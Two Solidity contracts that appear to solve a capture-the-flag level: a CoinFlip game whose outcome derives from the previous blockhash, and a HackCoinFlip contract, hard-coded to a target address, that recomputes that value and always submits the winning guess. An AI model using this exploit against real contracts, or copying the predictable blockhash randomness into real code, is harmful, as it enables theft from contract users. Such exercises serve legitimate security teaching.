// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract HackCoinFlip {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public originalContract = CoinFlip(0x86a9b343708130F1740Bc03f3F69db091dC5467F); 
    // address _coinFlipContract
//   constructor(address _coinFlipContract) public{
//       originalContract = CoinFlip(_coinFlipContract);
//   }

  function flipHack(bool guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - (1)));
    uint256 coinFlip = blockValue / (FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == guess) {
        originalContract.flip(guess);
    } else {
        originalContract.flip(!guess);
    }
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - (1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / (FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}